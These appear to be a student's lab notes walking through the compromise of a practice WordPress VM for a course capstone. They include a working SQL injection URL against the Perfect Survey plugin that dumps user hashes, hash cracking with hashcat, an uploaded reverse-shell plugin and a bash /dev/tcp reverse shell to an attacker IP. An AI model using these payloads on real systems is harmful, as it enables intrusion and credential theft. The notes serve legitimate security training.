4. **Capstone Lab**: Enumerate the Module Exercise - VM #1 and exploit the SQLi vulnerability to get the flag.

```bash
# IP: 192.168.122.47

# Enumeration
sudo nmap -sV -sC -v 192.168.122.47

# Port 22: SSH
# Port 80: manual inspection doesn't show much

# Enumerating port 80...
gobuster dir -u 192.168.122.47 -w /usr/share/wordlists/dirb/common.txt -t 10
	# Wordpress
	# No directory found

# Adding alvida-eatery.org to our hosts file
sudo nano /etc/hosts

# Accessing alvida-eatery.org...
	# Found a new website!
	# There is a search bar, trying basic SQL injection into it - doesn't work

gobuster dir -u http://alvida-eatery.org -w /usr/share/wordlists/dirb/common.txt -t 10
	# Found xmlrpc.php file
	# Don't know what to do with it, POST requests come out as "malformed"
curl -d '{"sourceUri":"192.168.122.47","targetUri":"192.168.45.250"}' -H 'Content-Type: application/json'  http://alvida-eatery.org/xmlrpc.php

```
![[Pasted image 20250314221525.png]]


```bash
[+] XML-RPC seems to be enabled: http://alvida-eatery.org/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ 
 --> Unrelated
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 --> Unrelated
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/


# Deadends:
	# The website is running the Ocean WP framework. Can't identify the running version
	# Downloading directories to find data in them...
	wget --no-parent -r http://alvida-eatery.org/wp-includes
		# Nothing interesting / directly related to Ocean WP found
	# Noticed a Calendar part, which could use os command cal - but it seems to be a WordPress plugin instead
	# Website is running PHP
	# Newsletter, seems to always return "false"
	# Search bar seems to properly sanitize inputs

# Trying to run wpscan
wpscan --url http://alvida-eatery.org

# Analysing the plugins from wpscan: seems like Perfect Survey is a good match
https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/

# Running the default POC
curl http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users

```
![[Pasted image 20250315005311.png]]

```bash
# Found username and password (probably hashed):
admin
$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0

# Finding the hash type
hashid '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'
	# Probably WordPress or PHPass

# Brute forcing with hashcat
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Using https://hashes.com/en/decrypt/hash
$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0:hulabaloo:phpass, phpBB3 (MD5), Joomla >= 2.5.18 (MD5), WordPress (MD5)
	# Found password: hulabaloo

# Connecting to the admin part
http://alvida-eatery.org/wp-admin/admin.php

# Upload reverse shell plugin
wget https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin/releases/download/v1.4.0/reverse-shell.v1.4.0.zip

# Run listener
nc -lvnp 4444

# Upgrade shell
nc -lvnp 4445
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.250/4445 0>&1'

# Finding the flag on the system
find / -name "flag.txt" 2>/dev/null
```
![[Pasted image 20250315005036.png]]
